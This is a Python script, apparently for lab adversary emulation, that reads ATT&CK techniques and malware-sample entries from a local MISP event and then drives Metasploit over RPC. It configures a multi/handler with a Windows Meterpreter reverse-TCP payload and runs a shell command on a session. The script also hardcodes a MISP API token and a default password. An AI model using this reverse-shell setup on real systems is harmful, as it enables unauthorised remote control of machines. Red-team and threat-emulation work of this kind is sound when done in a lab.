from pymisp import PyMISP, MISPEvent
import json
import jmespath
from pymetasploit3.msfrpc import MsfRpcClient

msf_server = "127.0.0.1"
msf_password = "metasploit"

# Initialize MSF Connection
try :
    client = MsfRpcClient(msf_password, port='55553', server=msf_server, ssl=True)
    print("[*]  Connected to Metasploit")
except Exception as e:
    print("[-] Failed to connect to Metasploit")
    exit(0)



# Initialize MISP Connection
misp_url = "http://localhost"
misp_token="7uSxM3tnnyUfFGcPFqp1O92P90LsK6au3bFgVrPi"
try:
    misp = PyMISP(misp_url, misp_token)
    print("[*]  Connected to MISP")
except Exception as e:
    print("[-] Failed to connect to MISP")
    exit(0)

event_id = 4

print()
print(f"[*] Reading Event #{event_id}")
event = misp.get_event(event_id)
event = event['Event']

attribute_galaxy_clusters = jmespath.search("Attribute[].Galaxy[].GalaxyCluster[]", event) 
event_galaxy_clusters = jmespath.search("Galaxy[].GalaxyCluster[]", event)
object_galaxy_clusters = jmespath.search("Object[].Attribute[].Galaxy[].GalaxyCluster[]", event)
payloads = jmespath.search("Object[].Attribute[?type=='malware-sample'][]", event)
galaxy_clusters = object_galaxy_clusters + attribute_galaxy_clusters + event_galaxy_clusters

# Get MITRE TTPs
print()
print("[*] Found below MITRE ATT&CK TTPs:")
for item in galaxy_clusters:
    print(f"{item['value']}")

# Get malware samples
print()
print("[*] Found below Malware Samples")
for item in payloads:
    print(f"#{item['id']} : {item['value']}")

print()
print("[*] Configuring Metasploit Exploit...")
exploit = client.modules.use('exploit', 'multi/handler')
payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
payload['LHOST'] = '192.168.56.3'
payload['LPORT'] = '6001'
print("[*] Listening for connections...")
print()
print("[*] Running shell commands:\n")
shell = client.sessions.session('1')
print(shell.run_shell_cmd_with_output("net accounts", None))  